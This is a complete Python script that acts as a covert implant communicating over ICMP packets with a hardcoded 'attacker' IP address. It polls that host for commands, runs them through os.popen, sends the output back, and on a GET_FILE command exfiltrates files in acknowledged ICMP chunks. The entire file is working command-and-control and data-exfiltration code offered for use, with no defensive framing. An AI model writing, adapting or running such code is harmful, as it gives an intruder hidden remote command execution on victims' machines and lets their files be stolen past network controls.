#!/usr/bin/env python3
import os
from scapy.all import *
import time
from scapy.layers.inet import IP, ICMP

def send_file_with_retry(file_path, attacker_ip):
    try:
        with open(file_path, "rb") as f:
            seq_num = 1
            max_retries = 3
            chunk_size = 1024  # 1KB chunks
            
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                # Send chunk with retry logic
                retry_count = 0
                while retry_count < max_retries:
                    # Send the chunk
                    file_chunk = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=seq_num)/Raw(load=chunk)
                    send(file_chunk, verbose=False)
                    print(f"Sent chunk {seq_num} (size: {len(chunk)} bytes)")
                    
                    # Wait for acknowledgment
                    rx = sniff(filter=f"icmp and src host {attacker_ip} and icmp[0]==0", count=1, timeout=2)
                    
                    if len(rx) > 0 and Raw in rx[0] and rx[0][Raw].load == b"ACK":
                        print(f"Received ACK for chunk {seq_num}")
                        break
                    
                    retry_count += 1
                    if retry_count < max_retries:
                        print(f"Retrying chunk {seq_num}")
                
                if retry_count >= max_retries:
                    print(f"Failed to get acknowledgment for chunk {seq_num}")
                    return False
                
                seq_num += 1
                time.sleep(0.01)  # Small delay between chunks
            
            # Send end-of-file marker
            for _ in range(3):  # Send EOF marker multiple times to ensure delivery
                eof_marker = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=seq_num)/Raw(load=b"END_OF_FILE")
                send(eof_marker, verbose=False)
                time.sleep(0.1)
            
            print("File transfer complete.")
            return True
            
    except FileNotFoundError:
        print(f"File {file_path} not found.")
        error_msg = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=1)/Raw(load=b"ERROR: File not found")
        send(error_msg, verbose=False)
        return False
    except Exception as e:
        print(f"Error during file transfer: {e}")
        error_msg = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=1)/Raw(load=f"ERROR: {str(e)}".encode())
        send(error_msg, verbose=False)
        return False

def main():
    # Server/Attacker's IP (replace with your server's IP)
    attacker_ip = "51.20.83.252"

    # Heartbeat interval (in seconds)
    heartbeat_interval = 10

    try:
        while True:
            # Send a heartbeat to the attacker
            print("Sending heartbeat to server...")
            heartbeat = IP(dst=attacker_ip)/ICMP(type="echo-request", id=0x0001, seq=0x1)/Raw(load="HEARTBEAT")
            send(heartbeat, verbose=False)

            # Wait for a command from the attacker
            print("Waiting for command from server...")
            rx = sniff(filter=f"icmp and src host {attacker_ip}", count=1, timeout=10)

            if len(rx) > 0 and Raw in rx[0]:
                # Show the sniffed packet details
                print("Packet captured:")
                rx[0].show()  # Add this line to inspect the captured packet

                if Raw in rx[0]:
                    try:
                        command = rx[0][Raw].load.decode('utf-8').strip()
                        print(f"Received command: {command}")

                        # Handle "GET_FILE" command
                        if command.startswith("GET_FILE:"):
                            file_path = command.split(":", 1)[1]
                            send_file_with_retry(file_path, attacker_ip)

                        # Handle other commands
                        else:
                            try:
                                result = os.popen(command).read()
                                reply = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=0x1)/Raw(load=result)
                                send(reply, verbose=False)
                                print("Command result sent.")
                            except Exception as e:
                                error_msg = f"Error executing command: {str(e)}"
                                reply = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=0x1)/Raw(load=error_msg)
                                send(reply, verbose=False)
                
                    except Exception as e:
                        print(f"Error processing command: {e}")
                        error_msg = IP(dst=attacker_ip)/ICMP(type="echo-reply", id=0x0001, seq=1)/Raw(load=f"ERROR: {str(e)}")
                        send(error_msg, verbose=False)

            time.sleep(heartbeat_interval)

    except KeyboardInterrupt:
        print("\nAgent terminated by user. Exiting...")

if __name__ == "__main__":
    main()